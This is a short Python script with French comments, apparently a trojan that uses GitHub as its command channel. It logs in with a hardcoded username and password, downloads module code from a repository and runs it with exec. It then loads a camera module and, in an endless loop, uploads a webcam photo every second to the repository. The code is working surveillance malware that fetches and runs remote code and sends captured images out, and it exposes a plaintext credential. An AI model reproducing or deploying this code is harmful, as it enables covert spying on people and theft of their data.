#!/usr/bin/python

import imp
import sys
import base64
import time
import os
from github3 import login
from subprocess import call

def connect_to_github() :
	gh = login("mehdi-desu",password="1090prixttc")
	repo = gh.repository("mehdi-desu","projet_impossible")
	branch = repo.branch("master")

	return gh,repo,branch	


def get_file_contents(file_path):
    gh, repo, branch = connect_to_github()
    if gh and repo and branch:
	#obtenir tous les fichier. 
        hash_list = branch.commit.commit.tree.recurse().tree
	
	#itteration sur tout les fichier	
        for hash in hash_list:
		#si on trouve le fichier q'on cherche alors
            if file_path in hash.path:
                file_contents_b64 = repo.blob(hash.sha).content
                file_contents = base64.b64decode(file_contents_b64).decode("utf-8")
                return file_contents
    return none

def load_module(name):
        #creer un objet moule
	module = imp.new_module(name)
	#copier le contenu de notre ficher dans ce module
	exec(get_file_contents("modules/"+name+".py"), module.__dict__)
	#ajouter notre module a la collection des module capabe d'etre utiliser par notre script 
	sys.modules[name] = module
	return module


def send(img):
	gh,repo,branch = connect_to_github()
	repo.create_file("data/"+time.strftime('%s')+".png","nouvelle photo",img)



cam = load_module("cam")

while True:
	img = cam.snap()
	send(img)
	time.sleep(1)
